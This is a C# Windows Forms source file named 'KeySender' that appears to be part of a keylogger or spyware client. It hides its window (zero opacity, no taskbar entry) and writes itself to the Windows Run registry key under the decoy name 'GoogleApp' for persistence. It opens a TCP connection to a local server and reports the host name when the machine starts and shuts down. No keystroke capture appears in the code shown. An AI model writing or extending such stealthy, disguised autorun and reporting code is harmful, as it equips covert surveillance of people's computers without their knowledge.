using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeySender
{
    public partial class Form1 : Form
    {
        TcpClient client;
        private StreamWriter writer;
        TcpClient tcpClient;
        const string name = "GoogleApp";
        public Form1()
        {
            SystemEvents.SessionEnded += OnSessionEnded;
            MainProgram();
        }

        private void OnSessionEnded(object sender, SessionEndedEventArgs args)
        {
            if (args.Reason == SessionEndReasons.SystemShutdown)
            {
                var p = $"{Convert.ToInt32(PackageType.Off)};{System.Net.Dns.GetHostName()}";
                SingletonWriter.Instance.Write(p);
            }
        }

        private void MainProgram()
        {
            this.WindowState = FormWindowState.Normal;
            this.ShowInTaskbar = false;
            this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
            this.Opacity = 0D;
            SetAutorunValue(true);
            ConnectToServer();
            var p = $"{Convert.ToInt32(PackageType.On)};{System.Net.Dns.GetHostName()}";
            SingletonWriter.Instance.Write(p);
        }

        private void Connection()
        {
            tcpClient = new TcpClient(AddressFamily.InterNetwork);
            IPAddress ip = IPAddress.Parse("127.0.0.1");
            tcpClient.Connect(ip, 50000);
        }

        private void ConnectToServer()
        {
            Connection();
            if (tcpClient.Connected)
            {
                client = tcpClient;
                CreateSendTask();
            }
            else
            {
                throw new Exception();
            }
        }

        private void CreateSendTask()
        {
            var ns = client.GetStream();
            writer = new StreamWriter(ns);
            writer.AutoFlush = true;
            SingletonWriter.CreateInstance(writer);
        }

        static public bool SetAutorunValue(bool autorun)
        {
            string ExePath = System.Windows.Forms.Application.ExecutablePath;
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                if (autorun)
                    reg.SetValue(name, ExePath);
                else
                    reg.DeleteValue(name);

                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }
    }
}
